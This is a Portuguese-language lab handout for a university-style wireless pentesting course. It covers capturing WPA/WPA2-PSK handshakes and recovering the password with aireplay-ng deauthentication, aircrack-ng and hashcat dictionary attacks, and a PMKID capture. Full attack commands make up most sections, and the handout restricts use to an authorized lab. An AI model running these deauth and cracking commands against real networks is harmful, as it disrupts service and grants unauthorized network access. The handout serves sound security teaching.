# 📡 Aula 08 — Testes de Invasão Wireless: Quebra de Senha WPA/WPA2-Pessoal (PSK) com Kali Linux

> **Módulo:** Redes Sem-Fio — Testes de Invasão (Pentest Wireless)
> **Aula:** 08 — Captura de Handshake e Ataque de Dicionário em WPA/WPA2-PSK (AES e AES+TKIP)
> **Equipamentos homologados:** TP-Link Archer C50 (W) e TP-Link Archer EC220-G5 (configurados pelos alunos em **WPA-Pessoal** e **WPA2-Pessoal**, cifras **AES** e **AES+TKIP**)
> **Estação de ataque:** Kali Linux + placa de rede wireless compatível com modo monitor/injeção
---

## ℹ️ Informações do Documento

| Campo | Descrição |
|---|---|
| **Autor** | Robson Vaamonde |
| **Data de criação** | 22/07/2026 |
| **Data de atualização** | 22/07/2026 |
| **Versão** | 0.01 |
| **Equipamentos testados** | Archer C50 (W) e Archer EC220-G5 |
---

### 🔗 Links do Autor

| Canal | Link |
|---|---|
| Procedimentos em TI | http://procedimentosemti.com.br |
| Bora para Prática | http://boraparapratica.com.br |
| Site pessoal | http://vaamonde.com.br |
| Facebook — Procedimentos em TI | https://www.facebook.com/ProcedimentosEmTi |
| Facebook — Bora para Prática | https://www.facebook.com/BoraParaPratica |
| Instagram — Procedimentos em TI | https://www.instagram.com/procedimentoem |
| YouTube — Bora para Prática | https://www.youtube.com/boraparapratica |
| LinkedIn — Robson Vaamonde | https://www.linkedin.com/in/robson-vaamonde-0b029028/ |
| GitHub — Procedimentos em TI | https://github.com/vaamonde |
---

## ⚠️ Aviso Legal e Ético — Leia Antes de Iniciar

> Este material é destinado **exclusivamente a fins didáticos**, em **ambiente de rede controlada e isolada** (laboratório), com equipamentos de propriedade da instituição de ensino e consentimento expresso para os testes.
>
> A utilização das técnicas aqui descritas contra redes de terceiros, sem autorização formal, configura crime previsto no **Código Penal Brasileiro** (arts. 154-A e 154-B — invasão de dispositivo informático; art. 266 — interrupção de serviço telemático; arts. 155 e 157 — subtração de coisa alheia), além de responsabilidade civil (Código Civil, arts. 927 a 943).
>
> Cada grupo deve atacar **somente** o Access Point que lhe foi atribuído no laboratório.
---

## 📑 Sumário

1. [Contextualização — WPA x WPA2, PSK x Enterprise, AES x TKIP](#01---contextualização--wpa-x-wpa2-psk-x-enterprise-aes-x-tkip)
2. [Preparação do Ambiente e Modo Monitor](#02---preparação-do-ambiente-e-modo-monitor)
3. [Reconhecimento e Identificação da Cifra](#03---reconhecimento-e-identificação-da-cifra)
4. [Captura Direcionada e Handshake](#04---captura-direcionada-e-handshake)
5. [Desautenticação do Cliente (Aireplay-ng)](#05---desautenticação-do-cliente-aireplay-ng)
6. [Verificando se o Handshake foi Capturado](#06---verificando-se-o-handshake-foi-capturado)
7. [Ataque de Dicionário com Aircrack-ng](#07---ataque-de-dicionário-com-aircrack-ng)
8. [Acelerando com GPU — Hashcat](#08---acelerando-com-gpu--hashcat)
9. [Ataque Complementar — PMKID (sem handshake completo)](#09---ataque-complementar--pmkid-sem-handshake-completo)
10. [Validação e Preenchimento do Relatório](#10---validação-e-preenchimento-do-relatório)
11. [Roteiro da Próxima Aula — WPA3](#-roteiro-da-próxima-aula--wpa3)
---

## 01 - Contextualização — WPA x WPA2, PSK x Enterprise, AES x TKIP

| Conceito | Descrição |
|----------|-----------|
| **WPA** (2003) | Solução emergencial lançada após a quebra do WEP. Usa **TKIP** (RC4 melhorado) como cifra padrão. |
| **WPA2** (2004) | Padrão definitivo, obrigatório na certificação Wi-Fi desde 2006. Introduziu a cifra **AES-CCMP**, opcionalmente ainda aceitando TKIP em modo misto para compatibilidade. |
| **Modo Pessoal (PSK)** | Autenticação por **chave pré-compartilhada** (senha única para todos os clientes) — é o único modo que o `aircrack-ng`/`hashcat` conseguem atacar. |
| **Modo Empresarial (802.1X/EAP)** | Autenticação individual por usuário via servidor **RADIUS** — fora do escopo desta aula (sem RADIUS no laboratório). O `airodump-ng` mostra o tipo de autenticação (`PSK` ou `MGT`); redes com `MGT` **não devem ser atacadas** por este método. |
| **AES (CCMP)** | Cifra robusta, sem quebra criptográfica prática conhecida. |
| **AES+TKIP (misto)** | Modo de compatibilidade que aceita clientes com ambas as cifras. |
---

> 💡 **Ponto-chave desta aula:** a cifra utilizada (AES puro ou AES+TKIP) **não altera o método de ataque**. O alvo do ataque não é a cifra dos dados, e sim a **chave pré-compartilhada**, revelada apenas por meio da captura do **4-way handshake** seguida de um ataque de **dicionário** — não existe atalho estatístico como no WEP. **Não há diferença metodológica entre atacar WPA e WPA2**: a técnica é idêntica para os dois protocolos.

> ⚠️ **Sem um bom dicionário, o `aircrack-ng` não tem como recuperar a chave**, mesmo capturando o handshake perfeitamente — reforce esse ponto com a turma antes de iniciar a prática. Utilize a wordlist do laboratório já preparada (`wordlist-laboratorio.txt` / `wordlist-laboratorio-expandida.txt`).
---

## 02 - Preparação do Ambiente e Modo Monitor

```bash
# Verificar se a interface wireless foi reconhecida
sudo iwconfig

# Verificar detalhes da placa (fabricante/chipset)
sudo lsusb

# Verificar o status de processos de gerenciamento da Rede Sem-Fio
# opção do comando airmon-ng: check (List all possible programs that could interfere with the wireless card)
sudo airmon-ng check

# Finalizando os processos de gerenciamento da Rede Sem-Fio
# opções do comando airmon-ng: check (List all possible programs that could interfere with the wireless card), 
# kill (If 'kill' is specified, it will try to kill all of them)
sudo airmon-ng check kill

# Habilitar o modo monitor da Rede Sem-Fio utilizando a Antena Externa USB
# opção do comando airmon-ng: start (Enable  monitor  mode on an interface (and specify a channel))
sudo airmon-ng start wlan1

# Verificando o modo monitor da Rede Sem-Fio utilizando a Antena Externa USB
sudo iwconfig
```

### ✅ Testes de Validação

| # | Teste |
|---|-------|
| 1 | `iwconfig` exibe `wlan1mon` com **Mode:Monitor**. |
| 2 | Nenhum processo do NetworkManager reaparece interferindo na interface. |
---

## 03 - Reconhecimento e Identificação da Cifra

```bash
# Escaneamento da rede utilizando o Airodump-NG em busca de Access Point e End Points
sudo airodump-ng wlan1mon
```

| Campo | Descrição |
|-------|-----------|
| **BSSID** | Endereço MAC do Access Point-alvo. |
| **CH** | Canal em que o AP está operando. |
| **ENC** | Deve aparecer como **`WPA`** ou **`WPA2`**. |
| **CIPHER** | Cifra em uso: **`CCMP`** (AES puro) ou **`TKIP CCMP`** (modo misto AES+TKIP). |
| **AUTH** | Tipo de autenticação — deve ser **`PSK`**. Redes com `MGT` usam modo Empresarial e **não podem** ser atacadas por este método (sem captura de handshake PSK válida). |
| **ESSID** | Nome da rede (SSID) configurado pelo grupo. |
| **STATION** | Endereço MAC de clientes conectados — necessário para o ataque de desautenticação. |
---

➡️ Anotar `BSSID`, `Canal`, `CIPHER` (AES ou AES+TKIP) e ao menos um `STATION` associado.
---

### ✅ Testes de Validação

| # | Teste |
|---|-------|
| 1 | O AP do grupo aparece com **ENC = WPA** ou **WPA2** e **AUTH = PSK**. |
| 2 | Campo `CIPHER` identificado corretamente (CCMP = AES / TKIP CCMP = AES+TKIP). |
---

## 04 - Captura Direcionada e Handshake

```bash
# Focar a captura em um único AP/canal para observar as informações de Beacons e Data Sources
# opção do comando airodump-ng: -c ( Indicates the frequencies to listen to), --bssid (t will only
# show networks, matching the given bssid), -w (Is  the  dump  file prefix to use)
sudo airodump-ng -c <CANAL> --bssid <BSSID_DO_AP> -w chavewpa wlan1mon
```

| Parâmetro | Descrição |
|-----------|-----------|
| `-c` | Fixa a captura no canal do AP-alvo. |
| `--bssid` | Filtra a captura apenas para o BSSID informado. |
| `-w chavewpa` | Prefixo dos arquivos de captura gravados em disco (ex.: `chavewpa-01.cap`), usados posteriormente pelo `aircrack-ng`. |
---

➡️ **Deixe esse terminal aberto e rodando.** Diferente do WEP, aqui **não interessa acumular pacotes de dados (`#Data`)** — o único evento relevante é a captura do **4-way handshake**, que ocorre no momento em que um cliente se autentica (ou reautentica) na rede.
---

## 05 - Desautenticação do Cliente (Aireplay-ng)

Como o handshake só é gerado no momento da (re)conexão do cliente, forçamos esse evento com um ataque de **desautenticação (deauth)**, obrigando um cliente já conectado a se reconectar — e assim capturamos o handshake completo.

| Passo | Ação |
|-------|------|
| 1 | Abrir um **segundo terminal**, mantendo o `airodump-ng` do passo anterior em execução. |
| 2 | Rodar o ataque de desautenticação direcionado ao cliente. |
---

```bash
# Focar a captura em um único AP/canal para observar as informações de Desautenticação (Deauth) e Handshake
# opções do comando aireplay-ng: -0 (This  attack  sends  deauthentication  packets  to  one  or more clients 
# which are currently associated with a particular  access point.), -a (Set Access Point MAC address), 
# -c (Set destination MAC address)
sudo aireplay-ng -0 5 -a <BSSID_DO_AP> -c <MAC_DO_CLIENTE_STATION> wlan1mon
```

| Parâmetro | Descrição |
|---|---|
| `-0 5` | Tipo de ataque **deauth**, enviando **5 pacotes** de desautenticação (ajustável; `-0 0` envia continuamente). |
| `-a` | BSSID (MAC) do AP-alvo. |
| `-c` | MAC do cliente (Station) a ser desautenticado, obtido no passo 03. |
| `wlan1mon` | Interface em modo monitor usada para a injeção. |

> ⚠️ **Sem cliente associado (STATION vazio)?** É necessário aguardar passivamente até que algum dispositivo se conecte naturalmente à rede — o modo passivo não exige capacidade de injeção, mas depende de um cliente se autenticar durante a captura.

> 💡 **Modo passivo (alternativa):** caso não queira interferir ativamente na rede, basta manter o `airodump-ng` do passo 04 rodando e aguardar a reconexão espontânea de algum dispositivo (ex.: um celular saindo do modo avião ou reconectando ao Wi-Fi).

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | O cliente-alvo perde e recupera a conexão com a rede durante o ataque. |
| 2 | No terminal do `airodump-ng`, aparece a mensagem **`WPA handshake: <BSSID>`** no canto superior direito da tela. |
---

## 06 - Verificando se o Handshake foi Capturado

```bash
# Verificando se foi possível capturar o Handshake nas transmissões de Rede Sem-Fio
# opções do comando aircrack-ng: -b (MAC address of access point)
sudo aircrack-ng -b <BSSID_DO_AP> chavewpa-01.cap
```

Ao rodar sem especificar dicionário, o `aircrack-ng` lista as redes presentes no arquivo `.cap` e indica se um handshake válido foi capturado para o BSSID (`1 handshake` ao lado do ESSID).

> 💡 **Dica:** se o handshake não aparecer, repita os passos 04 e 05 — em ambientes de laboratório com muitos grupos transmitindo simultaneamente, pacotes deauth podem se perder; vale repetir o ataque 2-3 vezes.
---

## 07 - Ataque de Dicionário com Aircrack-ng

Com o handshake confirmado, aplica-se o ataque de força bruta por dicionário — método **idêntico para WPA e WPA2**, e **idêntico para AES ou AES+TKIP**.

```bash
# Forçando uma quebra de senha WAP do Access Point utilizando o arquivo de dicionário
# opções do comando aircrack-ng: -b (MAC address of access point), -w (Path to a dictionary file for wpa cracking)
sudo aircrack-ng -b <BSSID_DO_AP> -w wordlist-laboratorio-expandida.txt chavewpa-01.cap
```

| Parâmetro | Descrição |
|---|---|
| `-b` | Filtra a análise para o BSSID do AP-alvo, caso o `.cap` tenha capturado mais de uma rede. |
| `-w` | Caminho do arquivo de dicionário (wordlist) a ser testado contra o handshake. |
| `chavewpa-01.cap` | Arquivo de captura gerado no passo 04. |
---

### ✅ Resultado Esperado

| Situação | Ação |
|---|---|
| ✅ `KEY FOUND! [ senha ]` | Senha PSK descoberta — anotar no relatório do grupo (junto com BSSID, ESSID e cifra AES/AES+TKIP). |
| ❌ `Passphrase not in dictionary` | A senha não consta na wordlist utilizada — confirmar se a senha do grupo está entre as sorteadas ou revisar a wordlist expandida. |
---

> ⚠️ **Reforço conceitual:** diferente do WEP, aqui **não adianta capturar mais pacotes** — se a senha não estiver no dicionário, o ataque falha independentemente do tempo de captura. A qualidade da wordlist é o fator decisivo.
---

## 08 - Acelerando com GPU — Hashcat

Para dicionários maiores ou testes de desempenho comparado, o **hashcat** aproveita a GPU e é significativamente mais rápido que o `aircrack-ng` (que roda em CPU).

```bash
# Converter a captura .cap para o formato aceito pelo hashcat
sudo hcxpcapngtool -o chavewpa.22000 chavewpa-01.cap

# Rodar o ataque de dicionário (modo 22000 = WPA-PBKDF2-PMKID+EAPOL)
sudo hashcat -m 22000 chavewpa.22000 wordlist-laboratorio-expandida.txt
```

| Parâmetro | Descrição |
|---|---|
| `hcxpcapngtool` | Converte o `.cap` do `airodump-ng` para o formato `.22000` esperado pelo hashcat (ferramenta do pacote `hcxtools`). |
| `-m 22000` | Modo de hash do hashcat correspondente a handshakes WPA/WPA2 (EAPOL) e PMKID. |
---

> 💡 **Alternativa citada no material do docente:** o `pyrit` também realiza ataques de dicionário acelerados por GPU (`pyrit -r chavewpa.cap -i wordlist.txt attack_passthrough`), porém está descontinuado e pode não estar disponível nas versões mais recentes do Kali — prefira o `hashcat` como ferramenta principal desta etapa.

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | Arquivo `.22000` gerado sem erros pelo `hcxpcapngtool`. |
| 2 | `hashcat` retorna a senha em texto claro ao final da linha correspondente ao handshake (`Status: Cracked`). |
---

## 09 - Ataque Complementar — PMKID (sem handshake completo)

Em alguns APs, é possível obter o **PMKID** diretamente do primeiro pacote EAPOL enviado pelo roteador, **sem precisar desautenticar nenhum cliente** nem aguardar um handshake completo — útil quando não há clientes conectados no momento do teste.

```bash
# Capturar o PMKID (não requer cliente associado nem deauth)
sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1

# Converter para o formato do hashcat
sudo hcxpcapngtool -o captura.22000 captura.pcapng

# Atacar com hashcat (modo 22000 também cobre PMKID)
sudo hashcat -m 22000 captura.22000 wordlist-laboratorio-expandida.txt
```

> 💡 **Quando usar:** este método é um complemento útil quando o AP não possui clientes ativos no momento do teste — nem todo AP é vulnerável a esse tipo de extração, então trate como uma alternativa, não substituto, do fluxo principal (passos 04-08).
---

## 10 - Validação e Preenchimento do Relatório

### ✅ Testes de Validação Final

| # | Teste |
|---|---|
| 1 | Conectar um dispositivo à rede do grupo usando a senha encontrada, confirmando o acesso. |
| 2 | Registrar no relatório: BSSID, ESSID, canal, protocolo (WPA ou WPA2), cifra (AES ou AES+TKIP), ferramenta utilizada (aircrack-ng ou hashcat), tempo total e senha descoberta. |
| 3 | Comparar o tempo de quebra entre a cifra **AES pura** e o modo **AES+TKIP** — a expectativa é que **não haja diferença relevante**, já que o ataque mira a chave PSK, não a cifra dos dados. Discutir esse ponto em grupo. |
| 4 | Comparar o tempo total desta aula com o tempo gasto no WEP (Aula 06), discutindo por que o WPA/WPA2 é considerado mais seguro mesmo sendo "quebrável" por dicionário. |
---

## ✅ Checklist Final da Aula

- [ ] Modo monitor habilitado (`wlan0mon`)
- [ ] AP do grupo identificado com **ENC = WPA/WPA2** e **AUTH = PSK**
- [ ] Cifra identificada (**CCMP** = AES / **TKIP CCMP** = AES+TKIP)
- [ ] Captura direcionada iniciada (`airodump-ng -w chavewpa`)
- [ ] Cliente desautenticado (`aireplay-ng -0`) ou handshake capturado passivamente
- [ ] Handshake confirmado (`WPA handshake: <BSSID>` / `1 handshake` no `aircrack-ng`)
- [ ] Ataque de dicionário executado com `aircrack-ng -w`
- [ ] (Opcional) Ataque acelerado testado com `hashcat -m 22000`
- [ ] (Opcional) Ataque PMKID testado quando não havia cliente associado
- [ ] Senha PSK descoberta e conexão validada
- [ ] Teste repetido nos dois cenários de cifra (AES e AES+TKIP) e resultados comparados
- [ ] Relatório do grupo preenchido com todos os dados da tabela acima
---

## 🗺️ Roteiro da Próxima Aula — WPA3

| Aula | Protocolo | Técnica principal | Ferramentas |
|---|---|---|---|
| **09** | WPA3-Personal (SAE) | Explicar por que o handshake tradicional (4-way) **não é suficiente** contra **SAE/Dragonfly** — o protocolo é resistente a ataques offline de dicionário por design (cada tentativa exige interação com o AP, ao contrário do WPA2). Abordar vetores residuais: downgrade para WPA2 em modo misto (WPA2/WPA3-Transition), possíveis side-channel attacks (ex.: Dragonblood, dependendo da atualidade do firmware) | Discussão teórica + testes práticos limitados em modo misto WPA2/WPA3, já que um ataque de dicionário offline direto não se aplica ao SAE puro |
---

> 💡 **Observação didática importante para a Aula 09:** diferente das aulas anteriores, o WPA3 puro **não pode ser atacado com o mesmo fluxo de captura de handshake + dicionário**. O roteiro dessa aula deverá ter caráter mais **conceitual/demonstrativo**, focando em mostrar aos alunos *por que* a técnica não funciona e explorando apenas os vetores residuais conhecidos (modo de transição, implementações vulneráveis). Se os APs do laboratório (Archer C50 e EC220-G5) não suportarem WPA3 nativamente, será necessário avaliar hardware alternativo ou tratar o tema de forma exclusivamente teórica.

> 📌 **Próxima aula:** Aula 09 — WPA3-Personal (SAE): por que o ataque de dicionário tradicional não funciona.
